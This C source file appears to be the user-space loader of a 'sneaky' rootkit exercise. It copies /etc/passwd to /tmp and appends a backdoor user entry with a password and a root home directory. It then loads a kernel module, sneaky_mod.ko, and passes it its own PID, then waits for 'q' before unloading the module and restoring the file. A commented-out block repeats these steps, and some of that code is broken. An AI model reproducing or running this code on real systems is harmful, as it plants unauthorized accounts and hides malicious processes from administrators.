#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include<fcntl.h>
#include<sys/stat.h>
#include<sys/types.h>
#include <string.h>
#include <sys/wait.h>
//const char *originfile="etc/password";
//const char *tmpfile="tmp/password";
  

int main(){
  //#1 print id
  printf("sneaky_process pid:%d\n",getpid());
  int cur_pid=0;
  //copy
  if((cur_pid=fork())==0){
    execlp("cp","cp","/etc/passwd","/tmp/passwd",NULL);
  }
  else{
    int status=0;
    if(waitpid(cur_pid,&status,WUNTRACED|WCONTINUED)==-1){
      perror("waitpid");
      return -1;
    }
    if (WIFSIGNALED(status)) {
      printf("killed by signal %d\n", WTERMSIG(status));
    } else if (WIFSTOPPED(status)) {
      printf("stopped by signal %d\n", WSTOPSIG(status));
    } else if (WIFCONTINUED(status)) {
      printf("continued\n");
    }
  }
  //add
 
  system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> /etc/passwd");
  //load module
  char cmd[100];
  sprintf(cmd, "insmod sneaky_mod.ko sneaky_process_id=%d", (int)getpid());
  system(cmd);

  while(1){
    if(getchar()=='q')
      break;
  }

  system("rmmod sneaky_mod");





  //restore password
  if((cur_pid=fork())==0){
    execlp("cp","cp","/tmp/passwd","/etc/passwd",NULL);
  }
  else{
    int status=0;
    if(waitpid(cur_pid,&status,WUNTRACED|WCONTINUED)==-1){
      perror("waitpid");
      return -1;
    }
    if (WIFSIGNALED(status)) {
      printf("killed by signal %d\n", WTERMSIG(status));
    } else if (WIFSTOPPED(status)) {
      printf("stopped by signal %d\n", WSTOPSIG(status));
    } else if (WIFCONTINUED(status)) {
      printf("continued\n");
    }
  }
  //  while(1){}
  /*  //2.1
  FILE *f_o =fopen("/etc/passwd","r");
  if(f_o==NULL) {
    perror("cannot open /etc/passwd");
    return -1;
  }
  char c;
  FILE *f_w=fopen("/tmp/passwd","w");
  while((c=fgetc(f_o))!=EOF){
    fprintf(f_w,"%c",c);
  }
  fclose(f_w);
  if(fclose(f_o)!=0){
    perror("cannot close file during coping");
    return -1;
  }
  //while(1){}
  //#2.2 add line to the original
  FILE *add_line=fopen("/etc/passwd","a");
  const char* s="sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
  fprintf(add_line,"%s",s);
  if(fclose(add_line)!=0){
    perror("cannot close add line");
    return -1;
  }
  //while(1){}
  //#3. load module
  /* int fork_val=0;
  if((fork_val=fork())==-1){
    perror("fork wrong");
    return -1;
  }
  else if(fork_val==0){//using
    char cur_p[50];
    memset(cur_p,0,50);
    sprintf(cur_p,"sneaky_id=%d",getppid());
    if(execlp("insmod","insmod","senaky_mod.ko",cur_p,NULL)==-1){
      perror("load module error");
      return -1;
    }
  }
  else{
    int status=0;
    if(waitpid(fork_val,&status,WUNTRACED|WCONTINUED)==-1){
      perror("waitpid");
      return -1;
    }
    if (WIFEXITED(status)) {
      printf("exited, status=%d\n", WEXITSTATUS(status));
    } else if (WIFSIGNALED(status)) {
      printf("killed by signal %d\n", WTERMSIG(status));
    } else if (WIFSTOPPED(status)) {
      printf("stopped by signal %d\n", WSTOPSIG(status));
    } else if (WIFCONTINUED(status)) {
      printf("continued\n");
    }
  }
  //3.wait for q
  printf("before");
  while(1){
    if(getchar()=='q')
      break;
  }
  printf("after");
  //4.unload
  fork_val=0;
  if((fork_val=fork())==-1){
    perror("fork wrong");
    return -1;
  }
  else if(fork_val==0){//using
    if(execlp("rmmod","rmmod","senaky_mod.ko",NULL)==-1){
      perror("load module error");
      return -1;
    }
  }
  else{
    int status=0;
    if(waitpid(fork_val,&status,WUNTRACED|WCONTINUED)==-1){
      perror("waitpid");
      return -1;
    }
    if (WIFEXITED(status)) {
      printf("exited, status=%d\n", WEXITSTATUS(status));
    } else if (WIFSIGNALED(status)) {
      printf("killed by signal %d\n", WTERMSIG(status));
    } else if (WIFSTOPPED(status)) {
      printf("stopped by signal %d\n", WSTOPSIG(status));
    } else if (WIFCONTINUED(status)) {
      printf("continued\n");
    }
    }*/
  //#5.restore
  /*
  FILE *f_w_restore =fopen("/etc/passwd","w");
  if(*f_w_restore==NULL) {
    perror("cannot open /etc/passwd");
    return -1;
  }
  char c;
  FILE *f_r_restore=fopen("/tmp/passwd","r");
  while((c=fgetc(f_w_restore))!=EOF){
    fprintf(f_w_restore,"%c",c);
  }
  fclose(f_w_restore);
  if( fclose(f_o_restore)!=0){
    perror("cannot close file during coping");
    return -1;
  }
  



  
  
  return EXIT_SUCCESS; */
}
